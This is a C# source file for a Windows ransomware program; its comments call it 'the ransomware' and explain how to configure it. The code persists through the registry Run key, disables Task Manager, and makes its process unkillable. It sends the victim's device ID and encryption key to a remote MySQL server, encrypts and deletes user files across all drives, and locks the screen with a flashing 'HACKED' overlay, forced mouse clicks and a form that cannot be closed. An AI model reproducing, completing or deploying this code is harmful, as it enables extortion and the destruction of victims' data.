using DeviceId;
using Microsoft.Win32;
using MySql.Data.MySqlClient;
using System;
using System.Collections.Generic;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Runtime.InteropServices.WindowsRuntime;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace takecare
{
    public partial class FrmMain : Form
    {
        private readonly bool debug = Properties.Settings.Default.debug;
        private readonly string extension = Properties.Settings.Default.extension;
        private readonly string defaultMessage = Properties.Settings.Default.message;
        private enum CypherMode
        {
            Encode,
            Decode
        }

        // "skipPath" is experimental and currently working
        private readonly string[] skipPaths = new[]
        {
              "System32", "WinSxS", "Program Files", "System Volume Information"
        };

        private readonly string[] allowedExtensions = new[]
{
            ".jpg", ".jpeg", ".gif", ".mp3", ".m4a", ".wav", ".pdf", ".raw", ".bat", ".json", ".doc", ".txt", ".png", ".cs", ".c", 
            ".java", ".h", ".rar", ".zip", ".7zip", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".odt", ".csv", ".sql", 
            ".mdb", ".sln", ".php", ".asp", ".aspx", ".html", ".xml", ".psd", ".xhtml", ".odt", ".ods", ".wma", ".wav", ".mpa", 
            ".ogg", ".arj", ".deb", ".pkg", ".rar", ".tar.gz", ".gz", ".zip", ".py", ".pl", ".bin", ".ai" ,".ico", ".asp", 
            ".aspx", ".css", ".js", ".py", ".sh", ".vb", "java", ".cpp"
        };

        public FrmMain()
        {
            InitializeComponent();
        }

        // This method is used to create a log file. This is mainly used for debugging when changing 
        // the ransomware itself or adding new features on your own. I at least used it for crash reports.
        public void Log(string text, string title)
        {
            try
            {
                if (File.Exists(Application.StartupPath + "\\log.txt"))
                {
                    string prefix = "[" + DateTime.Now + "] ";
                    File.AppendAllText(Application.StartupPath + "\\log.txt", prefix + text + Environment.NewLine);
                }
            } catch { }
        }

        // So this is pretty straight forward. This code tries to register the ransomware into the registry startup.
        // in order to enable this feature you need to go into the "Form1_Load()" method and add "RegisterStartup(true);". Theoretically.
        private void RegisterStartup(bool isChecked)
        {
            try
            {
                RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);

                if (isChecked)
                {
                    registryKey.SetValue(Properties.Settings.Default.application_name, Application.ExecutablePath);
                }
                else
                {
                    registryKey.DeleteValue(Properties.Settings.Default.application_name);
                }
            }
            catch(Exception ex)
            {
                Log(ex.Message, "RegisterStartUp");
            }
        }

        // This method is used to check the basic needs for the ransomware, like if the encryption key was ever set,
        // or its lenght is the correct size etc..
        private void Setup()
        {
            GenerateKeys();
            GenerateRandomApplicationName();
            ChangeProcessMode();
            ChangeTaskManagerAccess();
            ChangeDesktopScreem();
        }

        private void ChangeDesktopScreem()
        {
            // Check what kind of theme is selected. You can find more information about this in Github Wiki
            if (Properties.Settings.Default.theme == "default")
            {
                panel_theme_flash.Visible = false;
                panel_theme_flash.Enabled = false;
            }
            else if (Properties.Settings.Default.theme == "flash")
            {
                // Set Window to be Fullscreen and overlap
                this.WindowState = FormWindowState.Maximized;
                this.FormBorderStyle = FormBorderStyle.None;

                // Enable the Panel Control and make it fill the Screen
                panel_theme_flash.Visible = true;
                panel_theme_flash.Enabled = true;
                panel_theme_flash.Dock = DockStyle.Fill;

                // Position the Label and set its Text
                label_theme_flash.Text = "HACKED";
                label_theme_flash.Font = new Font(label_theme_flash.Font.FontFamily, this.Height / 16, label_theme_flash.Font.Style);
                label_theme_flash.Location = new Point((panel_theme_flash.Width / 2) - (label_theme_flash.Width / 2), (panel_theme_flash.Height / 2) - (label_theme_flash.Height / 2));

                // Setting up the Timer and the method
                timer_theme_lash.Enabled = true;
                timer_theme_lash.Interval = 1000;
                timer_theme_lash.Tick += new EventHandler(timer_theme_flash_tick);
            }
        }

        private void ChangeTaskManagerAccess()
        {
            try
            {
                if (Properties.Settings.Default.disable_taskmgr == true)
                {
                    MachineMananger.DisableTaskManager();
                    return;
                }

                MachineMananger.EnableTaskManager();
            }
            catch (Exception ex)
            {
                Log(ex.Message, "Form1_Load > ChangeTaskManagerAccess");
            }
        }

        private void GenerateKeys()
        {
            // Check if Encryption/Decryption Key was ever created on that machine
            if (Properties.Settings.Default.key.Length != 34)
            {
                Properties.Settings.Default.key = CryptoManager.GetRandomString(34);
                Properties.Settings.Default.Save();
                Properties.Settings.Default.Reload();

                if (debug == true)
                {
                    WriteLine($@"Generated key: {Properties.Settings.Default.key}");
                }
            }
            else
            {
                if (debug == true)
                {
                    WriteLine($@"Key is: {Properties.Settings.Default.key}");
                }
            }
        }

        private void GenerateRandomApplicationName()
        {
            // Check if Application name is already set. If not, generate one
            // This should be random to try to be undetected from Anti-Virus
            if (Properties.Settings.Default.application_name.Length != 12)
            {
                Properties.Settings.Default.application_name = CryptoManager.GetRandomString(12);
                Properties.Settings.Default.Save();
                Properties.Settings.Default.Reload();

                if (debug == true)
                {
                    if (debug == true)
                    {
                        WriteLine($@"Generated Application Name: {Properties.Settings.Default.application_name}");
                    }

                    Log($@"Generated Application Name: {Properties.Settings.Default.application_name}", "Form1_Load > Generate Application Name");
                }
            }
            else
            {
                if (debug == true)
                {
                    WriteLine($@"Key is: {Properties.Settings.Default.key}");
                }
            }
        }

        private void ChangeProcessMode()
        {
            if (Properties.Settings.Default.unkillable == true)
            {
                ProcessMananger.ProcessUnkillable();
                return;
            }

            ProcessMananger.ProcessKillable();
        }

        // This is used for the theme feature were there is once theme that flashes color.
        // This is responsible for the flashing part. You can change 'backcolor' and 'forecolor'
        // to something to your likings.
        private void timer_theme_flash_tick(object sender, EventArgs e)
        {
            // Switches the Color of the Panel and Label

            Color backcolor = Color.Red;            // Background Color
            Color forecolor = Color.Black;          // Font Color

            if(panel_theme_flash.BackColor == backcolor)
            {
                panel_theme_flash.BackColor = forecolor;
                label_theme_flash.ForeColor = backcolor;
            }
            else
            {
                panel_theme_flash.BackColor = backcolor;
                label_theme_flash.ForeColor = forecolor;
            }
        }

        // This is the entry point for the whole ransomware. Everything you put there 
        // will be executed first. Well at list this is where the program pointer will be set to.
        private void FrmMain_Load(object sender, EventArgs e)
        {
            string deviceId = string.Empty;

            // Simple "Styling"
            ShowInTaskbar = false;
            Text = "";
            ShowIcon = false;
            // Will make the ransomware overlay other applications
            //this.TopMost = true;    

            // Check if generated Strings are set like Application Name, Encryption Key, etc... are set
            Setup();

            // Register application to startup.
            RegisterStartup(true);

            timer1.Enabled = true;
            timer1.Start();

            ChangePanelSettings();

            // the following code will register the victims machine on the mysql database server. 
            // this includes the generated deviceId and the encryption key.
            if (Properties.Settings.Default.db_enable == true)
            {
                // Connection String for MySQL Connection, if enabled.
                string myConnectionString = GetConnectionString();

                try
                {
                    MySqlConnection connection = new MySqlConnection(myConnectionString);
                    MySqlCommand command = connection.CreateCommand();
                    
                    command.CommandText = $@"INSERT INTO machine (deviceID,pass) VALUES ('{MachineMananger.GetDeviceInfo()}', '{Properties.Settings.Default.key}')";
                    connection.Open();
                    
                    IDataReader Reader = command.ExecuteReader();

                    while (Reader.Read())
                    {
                        string row = "";
                        for (int i = 0; i < Reader.FieldCount; i++)
                            row += Reader.GetValue(i).ToString() + ", ";
                        Console.WriteLine(row);
                    }
                    connection.Close();
                }
                catch (Exception ex)
                {
                    if (ex.Message.Contains("DUPLICATE"))
                    {

                    }
                    else
                    {
                        Log(ex.Message, "Form1_Load > MySQL");
                    }
                }
            }

            // This will try to get as many files as possible.
            // Its not perferct and might fail sometimes on some drives etc..
            Task.Run(() => ManageDrives(CypherMode.Encode));
        }

        private static string GetConnectionString()
        {
            return $@"SERVER={Properties.Settings.Default.db_host};
                      DATABASE={Properties.Settings.Default.db_database};
                      UID={Properties.Settings.Default.db_user}; 
                      PASSWORD={Properties.Settings.Default.db_pass};";
        }

        private void ChangePanelSettings()
        {
            lblTitle.Text = Properties.Settings.Default.application_title;
            lblTitle.Location = new Point(panel_main.Width / 2 - lblTitle.Width / 2, lblTitle.Location.Y);
            panel_main.Location = new Point(this.Width / 2 - panel_main.Width / 2, this.Height / 2 - panel_main.Height / 2);
        }

        public void WriteLine(string text)
        {
            txtLog.AppendText($"{text}{Environment.NewLine}");
        }

        private void ChangeAllFiles(string path, CypherMode mode = CypherMode.Encode)
        {
            try
            {
                if ((File.GetAttributes(path) & FileAttributes.ReparsePoint) != FileAttributes.ReparsePoint)
                {
                    string newFilePath = string.Empty;
                    string defaultKey = Properties.Settings.Default.key;

                    foreach (string folder in GetValidDirectories(path))
                    {
                        foreach (string filePath in Directory.GetFiles(Path.GetFullPath(folder)))
                        {
                            string extension = Path.GetExtension(filePath);

                            if (IsValidExtension(extension))
                            {
                                switch (mode)
                                {
                                    case CypherMode.Encode:
                                        if (FileManager.HasExtension(filePath, extension)) break;

                                        newFilePath = FileManager.AddExtension(filePath, extension);

                                        CryptoManager.EncodeFile(filePath, newFilePath, defaultKey);

                                        WriteLine($@"Encrypted {filePath}");

                                        RemoveFile(filePath);
                                        break;

                                    case CypherMode.Decode:
                                        if (!FileManager.HasExtension(filePath, extension)) break;

                                        newFilePath = FileManager.RemoveExtension(filePath, extension);

                                        CryptoManager.DecodeFile(filePath, newFilePath, defaultKey);

                                        WriteLine($"Decrypted {filePath}");

                                        RemoveFile(filePath);
                                        break;

                                    default: throw new NotSupportedException();
                                }
                            }
                        }

                        ChangeAllFiles(folder);
                    }
                }
            }
            catch (Exception e)
            {
                WriteLine(e.Message); Log(e.Message, "ShowAllFolderUnder > General Error");
            }
        }

        private bool IsValidExtension(string extension)
        {
            return allowedExtensions.Contains(extension.ToLower());
        }

        private IEnumerable<string> GetValidDirectories(string path)
        {
            return Directory.GetDirectories(path).Where(directory => !skipPaths.Contains(directory));
        }

        private void RemoveFile(string filePath)
        {
            try
            {
                File.Delete(filePath);
            }
            catch (Exception ex2)
            {
                WriteLine($"Cant delete file {ex2.Message}");
                Log(ex2.Message, "ShowAllFoldersUnder > Delete Error");
            }
        }

        private void ManageDrives(CypherMode mode)
        {
            foreach (DriveInfo drive in DriveInfo.GetDrives())
            {
                ChangeDrive(drive, mode);
            }
        }

        private void ChangeDrive(DriveInfo drive, CypherMode mode)
        {
            WriteLine($@"Found drive {drive.Name}");
            Log($@"Found drive {drive.Name}", "GetFiles > Drive State Check");

            try
            {
                if (!drive.IsReady) throw new AccessViolationException("Drive is not ready.");

                ChangeAllFiles(drive.Name);

                FileManager.WriteHtmlFile(drive.Name, defaultMessage);

            }
            catch (Exception ex)
            {
                Log($@"Found drive {drive.Name} , but it's not ready.", "GetFiles > Drive State Check");
                WriteLine($@"Found drive {drive.Name}, but it's not ready.");
                Log($@"More information about the exception: {ex.Message}", "");
            }
        }

        // used for the mouse click simulation. This is important and should not be touched.
        [DllImport("user32.dll", CharSet = CharSet.Auto, CallingConvention = CallingConvention.StdCall)]
        public static extern void mouse_event(uint dwFlags, uint dx, uint dy, uint cButtons, uint dwExtraInfo);
        private const int MOUSEEVENTF_LEFTDOWN = 0x02;
        private const int MOUSEEVENTF_LEFTUP = 0x04;

        public void DoMouseClick()  // makes the mouse click.
        {
            // x and y are the locations where the mouse click will be performed. in this case, in the middle of the screen.
            uint X = (uint)Screen.PrimaryScreen.WorkingArea.Width / 2;
            uint Y = (uint)Screen.PrimaryScreen.WorkingArea.Height / 2;
            mouse_event(MOUSEEVENTF_LEFTDOWN | MOUSEEVENTF_LEFTUP, X, Y, 0, 0);
        }

        // This is the code used to move the mouse to a certain position and perform a mouse click
        // On default, the mouse position will be set to the center of the screen
        private void timer1_Tick(object sender, EventArgs e)
        {
            Point leftTop = new Point(Screen.PrimaryScreen.WorkingArea.Width / 2, Screen.PrimaryScreen.WorkingArea.Height / 2);
            Cursor.Position = leftTop;

            // If mouse click is enabled (set to "true" in Project Settings) , the mouse will be clicked each intervall. 
            // This might be a work around for diabling ALT + Tab etc...
            if (Properties.Settings.Default.clickMouse == true)
            {
                DoMouseClick();
            }
        }

        private void FrmMain_FormClosing(object sender, FormClosingEventArgs e)
        {
            e.Cancel = true;
        }

        private void BtnDecrypt_Click(object sender, EventArgs e)
        {
            if(!string.IsNullOrEmpty(textBoxKey.Text.Trim()))
            {
                ManageDrives(CypherMode.Decode);
            }
        }
    }
}
